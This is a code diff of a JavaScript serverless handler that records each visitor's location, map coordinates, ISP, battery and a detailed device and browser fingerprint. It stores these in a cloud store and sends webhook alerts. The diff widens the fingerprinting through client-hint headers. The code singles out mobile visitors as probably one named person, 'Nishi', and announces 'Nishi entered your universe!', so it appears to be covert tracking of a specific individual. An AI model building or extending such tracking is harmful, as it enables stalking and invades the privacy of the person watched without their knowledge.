@@ -8,6 +8,8 @@
  * - In-memory fallback
  */
 
+import { CLIENT_HINT_HEADERS, resolveClientEnvironment } from './clientEnvironment.js';
+
 const CLOUD_STORE_URL = 'https://kvdb.io/K9m8Wj6T2xAnimatedNishi/';
 
 function getRedisCredentials() {
@@ -81,48 +83,49 @@ async function saveCloudData(key, value) {
   } catch (e) {}
 }
 
-function parseUserAgent(ua = '') {
-  let device = 'Desktop';
-  let os = 'Unknown OS';
-  let browser = 'Unknown Browser';
+function environmentDetailScore(environment = {}) {
+  let score = 0;
+  if (environment.browserVersion && !/\.0\.0\.0$/.test(environment.browserVersion)) score += 2;
+  if (environment.osVersion) score += 2;
+  if (environment.deviceModel && !/^(iPhone|iPad)$/.test(environment.deviceModel)) score += 1;
+  if (environment.architecture) score += 1;
+  if (environment.screen) score += 1;
+  if (environment.networkLabel) score += 1;
+  return score;
+}
 
-  if (/iPhone/i.test(ua)) {
-    device = 'iPhone';
-    const match = ua.match(/OS (\d+[_.]\d+)/i);
-    os = match ? `iOS ${match[1].replace(/_/g, '.')}` : 'iOS';
-  } else if (/iPad/i.test(ua)) {
-    device = 'iPad';
-    os = 'iPadOS';
-  } else if (/Android/i.test(ua)) {
-    device = 'Android Phone';
-    const match = ua.match(/Android (\d+([.]\d+)?)/i);
-    os = match ? `Android ${match[1]}` : 'Android';
-  } else if (/Macintosh|Mac OS X/i.test(ua)) {
-    device = 'Mac Desktop';
-    os = 'macOS';
-  } else if (/Windows/i.test(ua)) {
-    device = 'Windows PC';
-    os = 'Windows';
-  } else if (/Linux/i.test(ua)) {
-    device = 'Linux PC';
-    os = 'Linux';
-  }
+function applyEnvironment(session, environment, isp) {
+  session.device = environment.deviceLabel;
+  session.os = environment.osLabel;
+  session.browser = environment.browserLabel;
+  session.browserName = environment.browserName;
+  session.browserVersion = environment.browserVersion;
+  session.browserEngine = environment.browserEngine;
+  session.inApp = environment.inApp;
+  session.deviceType = environment.deviceType;
+  session.deviceVendor = environment.deviceVendor;
+  session.deviceModel = environment.deviceModel;
+  session.language = environment.language;
+  session.timeZone = environment.timeZone;
+  session.architecture = environment.architecture;
+  session.bitness = environment.bitness;
+  session.viewport = environment.viewport;
+  session.pixelRatio = environment.pixelRatio;
+  session.orientation = environment.orientation;
+  session.touch = environment.touch;
+  session.cores = environment.cores;
+  session.memoryGb = environment.memoryGb;
+  session.colorScheme = environment.colorScheme;
+  if (environment.screen) session.screen = environment.screen;
 
-  if (/Instagram/i.test(ua)) {
-    browser = 'Instagram In-App Browser';
-  } else if (/WhatsApp/i.test(ua)) {
-    browser = 'WhatsApp In-App Browser';
-  } else if (/Chrome/i.test(ua) && !/Edge|OPR/i.test(ua)) {
-    browser = /Mobile/i.test(ua) ? 'Chrome Mobile' : 'Chrome';
-  } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
-    browser = /Mobile/i.test(ua) ? 'Mobile Safari' : 'Safari';
-  } else if (/Firefox/i.test(ua)) {
-    browser = 'Firefox';
-  } else if (/Edg/i.test(ua)) {
-    browser = 'Microsoft Edge';
-  }
+  const networkParts = [];
+  if (environment.networkLabel) networkParts.push(environment.networkLabel);
+  if (isp && isp !== 'Telecom / Wi-Fi') networkParts.push(isp);
+  if (networkParts.length) session.network = networkParts.join(' · ');
 
-  return { device, os, browser };
+  session.isMobile = environment.deviceType === 'mobile' || environment.deviceType === 'tablet';
+  session.isProbableNishi = session.isMobile;
+  session.environment = environment;
 }
 
 function formatDuration(seconds = 0) {
@@ -134,10 +137,12 @@ function formatDuration(seconds = 0) {
 }
 
 export default async function handler(req, res) {
-  res.setHeader('Access-Control-Allow-Credentials', true);
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
   res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
+  Object.entries(CLIENT_HINT_HEADERS).forEach(([key, value]) => {
+    res.setHeader(key, value);
+  });
 
   if (req.method === 'OPTIONS') {
     res.status(200).end();
@@ -179,7 +184,11 @@ export default async function handler(req, res) {
       }
 
       const userAgent = req.headers['user-agent'] || '';
-      const parsedUA = parseUserAgent(userAgent);
+      const environment = resolveClientEnvironment({
+        userAgent,
+        headers: req.headers,
+        client: body.client
+      });
 
       // Location resolution (client lookup details + Vercel edge headers fallback)
       const country = body.clientCountry || req.headers['x-vercel-ip-country'] || 'India';
@@ -213,7 +222,7 @@ export default async function handler(req, res) {
           time: localTimeString,
           date: localDateString,
           timestamp: now.toISOString(),
-          device: `${parsedUA.device} (${parsedUA.os})`,
+          device: `${environment.deviceLabel} (${environment.osLabel})`,
           location: locationString,
           mapsUrl: mapsUrl || body.clientMapsUrl
         };
@@ -237,7 +246,7 @@ export default async function handler(req, res) {
                   color: 16723317,
                   fields: [
                     { name: '🕒 Time', value: `${localTimeString} (${localDateString})`, inline: true },
-                    { name: '📱 Device', value: parsedUA.device, inline: true },
+                    { name: '📱 Device', value: `${environment.deviceLabel} · ${environment.browserLabel}`, inline: true },
                     { name: '📍 Location', value: locationString, inline: true },
                     ...(mapsUrl ? [{ name: '🗺️ Map', value: `[Open on Google Maps](${mapsUrl})`, inline: false }] : [])
                   ],
@@ -261,7 +270,6 @@ export default async function handler(req, res) {
 
       if (sessionIndex === -1) {
         // New session entry
-        const isMobileDevice = /iPhone|Android|iPad/i.test(parsedUA.device);
         const newSession = {
           sessionId,
           date: localDateString,
@@ -271,12 +279,9 @@ export default async function handler(req, res) {
           lastActiveTimestamp: now.toISOString(),
           durationSeconds: durationSeconds,
           durationFormatted: formatDuration(durationSeconds),
-          device: parsedUA.device,
-          os: parsedUA.os,
-          browser: parsedUA.browser,
-          screen: body.screen || 'Unknown',
+          screen: 'Unknown',
           battery: body.battery || 'Unavailable',
-          network: body.network || 'Cellular / Wi-Fi',
+          network: 'Unknown',
           location: locationString,
           city: city,
           region: region,
@@ -285,11 +290,11 @@ export default async function handler(req, res) {
           longitude: longitude,
           mapsUrl: mapsUrl,
           isp: isp,
-          isMobile: isMobileDevice,
-          isProbableNishi: isMobileDevice,
           status: body.action === 'session_end' ? 'completed' : 'active',
           actions: [body.action || 'page_view']
         };
+        applyEnvironment(newSession, environment, isp);
+        const isMobileDevice = newSession.isMobile;
 
         existingSessions.unshift(newSession);
 
@@ -306,10 +311,10 @@ export default async function handler(req, res) {
                   title: isMobileDevice ? '🌸 Nishi entered your universe!' : '✨ New Visitor on your universe!',
                   color: isMobileDevice ? 16723317 : 3447003,
                   fields: [
-                    { name: '📱 Device', value: `${parsedUA.device} (${parsedUA.os})`, inline: true },
-                    { name: '🌐 Browser', value: parsedUA.browser, inline: true },
+                    { name: '📱 Device', value: `${environment.deviceLabel} (${environment.osLabel})`, inline: true },
+                    { name: '🌐 Browser', value: environment.browserLabel, inline: true },
                     { name: '📍 Location', value: locationString, inline: true },
-                    { name: '📶 Network', value: `${body.network || 'Cellular'} (${isp})`, inline: true },
+                    { name: '📶 Network', value: newSession.network || isp || 'Unknown', inline: true },
                     { name: '🔋 Battery', value: body.battery || 'N/A', inline: true },
                     { name: '🕒 Time', value: localTimeString, inline: true },
                     ...(mapsUrl ? [{ name: '🗺️ Map', value: `[Open on Google Maps](${mapsUrl})`, inline: false }] : [])
@@ -340,8 +345,10 @@ export default async function handler(req, res) {
           sess.battery = body.battery;
         }
 
-        if (body.network && body.network !== 'Cellular / Wi-Fi') {
-          sess.network = body.network;
+        const incomingScore = environmentDetailScore(environment);
+        const storedScore = environmentDetailScore(sess.environment);
+        if (body.client && incomingScore >= storedScore) {
+          applyEnvironment(sess, environment, isp || sess.isp);
         }
 
         if (city && (!sess.city || sess.city === 'Unknown City')) {
